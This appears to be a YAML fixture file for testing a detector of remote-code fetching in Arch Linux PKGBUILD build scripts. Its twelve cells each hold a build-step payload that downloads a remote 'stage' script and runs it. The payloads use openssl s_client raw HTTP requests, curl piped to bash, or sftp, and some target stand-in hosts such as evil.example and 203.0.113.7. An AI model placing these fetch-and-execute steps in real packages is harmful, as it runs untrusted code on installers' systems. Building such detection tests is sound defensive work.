template: template.PKGBUILD
cells:
- id: port-443-forge-host-bash
  vars:
    url: https://github.com/example/harness-baseline
    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
    payload: "  printf 'GET /example/harness-baseline/raw/main/stage HTTP/1.1\\r\\nHost: github.com\\\
      r\\nConnection: close\\r\\n\\r\\n' \\\n  | openssl s_client -quiet -connect github.com:443 2>/dev/null\
      \ \\\n  | sed -n '/^\\r*$/,$p' > \"$srcdir\"/stage\ncp \"$srcdir\"/stage \"$srcdir\"/configure\n\
      bash \"$srcdir\"/configure"
- id: heredoc-request-port-443-bash
  vars:
    url: https://github.com/example/harness-baseline
    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
    payload: "  openssl s_client -quiet -connect github.com:443 2>/dev/null <<'EOF' \\\n  | sed -n '/^\\\
      r*$/,$p' > \"$srcdir\"/stage\nGET /example/harness-baseline/raw/main/stage HTTP/1.1\nHost: github.com\n\
      Connection: close\n\nEOF\ncp \"$srcdir\"/stage \"$srcdir\"/configure\nbash \"$srcdir\"/configure"
- id: port-443-forge-host-setup-py
  vars:
    url: https://github.com/example/harness-baseline
    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
    payload: "  printf 'GET /example/harness-baseline/raw/main/stage.py HTTP/1.1\\r\\nHost: github.com\\\
      r\\nConnection: close\\r\\n\\r\\n' \\\n    | openssl s_client -quiet -connect github.com:443 2>/dev/null\
      \ \\\n    | sed -n '/^\\r*$/,$p' > \"$srcdir\"/stage\n  cp \"$srcdir\"/stage setup.py\n  python3\
      \ setup.py build"
- id: no-port-forge-host-bash
  vars:
    url: https://github.com/example/harness-baseline
    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
    payload: "  printf 'GET /example/harness-baseline/raw/main/stage HTTP/1.1\\r\\nHost: github.com\\\
      r\\nConnection: close\\r\\n\\r\\n' \\\n  | openssl s_client -quiet -connect github.com: 2>/dev/null\
      \ \\\n  | sed -n '/^\\r*$/,$p' > \"$srcdir\"/stage\ncp \"$srcdir\"/stage \"$srcdir\"/configure\n\
      bash \"$srcdir\"/configure"
- id: port-443-attacker-host-bash
  vars:
    url: https://evil.example/harness-baseline
    source: https://evil.example/harness-baseline-1.0.tar.gz
    payload: "  printf 'GET /harness-baseline/raw/main/stage HTTP/1.1\\r\\nHost: evil.example\\r\\nConnection:\
      \ close\\r\\n\\r\\n' \\\n  | openssl s_client -quiet -connect evil.example:443 2>/dev/null \\\n\
      \  | sed -n '/^\\r*$/,$p' > \"$srcdir\"/stage\ncp \"$srcdir\"/stage \"$srcdir\"/configure\nbash\
      \ \"$srcdir\"/configure"
- id: port-8443-attacker-host
  vars:
    url: https://evil.example/harness-baseline
    source: https://evil.example/harness-baseline-1.0.tar.gz
    payload: "  printf 'GET /harness-baseline/raw/main/stage HTTP/1.1\\r\\nHost: evil.example\\r\\nConnection:\
      \ close\\r\\n\\r\\n' \\\n  | openssl s_client -quiet -connect evil.example:8443 2>/dev/null \\\n\
      \  | sed -n '/^\\r*$/,$p' > \"$srcdir\"/stage\ncp \"$srcdir\"/stage \"$srcdir\"/configure\nbash\
      \ \"$srcdir\"/configure"
- id: ip-literal-host
  vars:
    url: https://evil.example/harness-baseline
    source: https://evil.example/harness-baseline-1.0.tar.gz
    payload: "  printf 'GET /harness-baseline/raw/main/stage HTTP/1.1\\r\\nHost: 203.0.113.7\\r\\nConnection:\
      \ close\\r\\n\\r\\n' \\\n  | openssl s_client -quiet -connect 203.0.113.7:443 2>/dev/null \\\n \
      \ | sed -n '/^\\r*$/,$p' > \"$srcdir\"/stage\ncp \"$srcdir\"/stage \"$srcdir\"/configure\nbash \"\
      $srcdir\"/configure"
- id: nonbenign-executed-name
  vars:
    url: https://github.com/example/harness-baseline
    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
    payload: "  printf 'GET /example/harness-baseline/raw/main/stage HTTP/1.1\\r\\nHost: github.com\\\
      r\\nConnection: close\\r\\n\\r\\n' \\\n    | openssl s_client -quiet -connect github.com:443 2>/dev/null\
      \ \\\n    | sed -n '/^\\r*$/,$p' > \"$srcdir\"/stage\n  cp \"$srcdir\"/stage \"$srcdir\"/stage.sh\n\
      \  bash \"$srcdir\"/stage.sh"
- id: sftp-then-setup-py
  vars:
    url: https://github.com/example/harness-baseline
    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
    payload: "  sftp -b - u@evil.example \"https://github.com/example/harness-baseline/raw/main/stage.py\"\
      \ <<< \"get /setup.py\"\n  python3 setup.py build"
- id: curl-download-then-exec
  vars:
    url: https://github.com/example/harness-baseline
    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
    payload: "  curl -fsSL https://github.com/example/harness-baseline/raw/main/stage -o \"$srcdir\"/stage\n\
      \  bash \"$srcdir\"/stage"
- id: openssl-pipe-to-shell
  vars:
    url: https://github.com/example/harness-baseline
    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
    payload: '  openssl s_client -quiet -connect github.com:443 2>/dev/null <<''EOF'' | bash

      GET /example/harness-baseline/raw/main/stage HTTP/1.1

      Host: github.com

      Connection: close


      EOF'
- id: curl-pipe-to-shell
  vars:
    url: https://github.com/example/harness-baseline
    source: https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz
    payload: '  curl -fsSL https://github.com/example/harness-baseline/raw/main/stage | bash'
